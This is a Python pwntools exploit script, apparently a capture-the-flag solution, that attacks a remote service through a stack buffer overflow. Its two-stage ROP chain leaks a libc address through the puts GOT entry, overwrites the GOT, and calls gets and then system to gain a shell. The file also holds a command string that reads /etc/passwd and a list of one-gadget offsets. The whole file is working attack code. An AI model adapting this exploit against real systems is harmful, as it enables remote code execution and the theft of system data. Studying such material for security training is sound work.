from pwn import *
import random

if __name__ == "__main__":
    puts_got = 0x804A018 
    read_got = 0x804A004
    alarm_got = 0x804A014  
    puts = 0x80485D0
    sleep = 0x80485B0
    read = 0x8048580
    infloop = 0x80487B0
    bof = 0x8048790

    libc = ELF("./remote_libc")

    p = remote("remote16.goatskin.kr", 25252)

    pr = 0x080486a3 # pop_ebp
    ppr = 0x080486a2
    pppr = 0x080488bd

    pay = "A"*0x40C
    pay += p32(puts)+p32(pr)+p32(puts_got) # leak libc
    pay += p32(read)+p32(pppr)+p32(0)+p32(puts_got)+p32(4)
    pay += p32(sleep)+p32(pr)+p32(100)

    p.send(pay)

    while True:
        data = p.recvline()
        if data!="Sand is leaking\n":
            LIBC = u32(data[:4]) - libc.symbols['puts']
            break
    
    log.info("LIBC: 0x%x"%LIBC)

    oneshots = [0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
    p.send(p32(bof))

    # second ROP
    open = LIBC + libc.symbols['open']
    read = LIBC + libc.symbols['read'] # GOT is ruined 
    puts = LIBC + libc.symbols['puts']
    system = LIBC + libc.symbols['system']
    gets = LIBC + libc.symbols['gets']
    write = LIBC + libc.symbols['write']
    mprotect = LIBC + libc.symbols['mprotect']

    space = 0x804A02C 
    entry = LIBC + 0x187d0

    cmd = "cat /etc/passwd\x00"
    pay = "AAAA"*0xF7
    pay += p32(gets)+p32(pr)+p32(space)
    pay += p32(system)+p32(0)+p32(space)
    

    p.send(pay)


    p.interactive()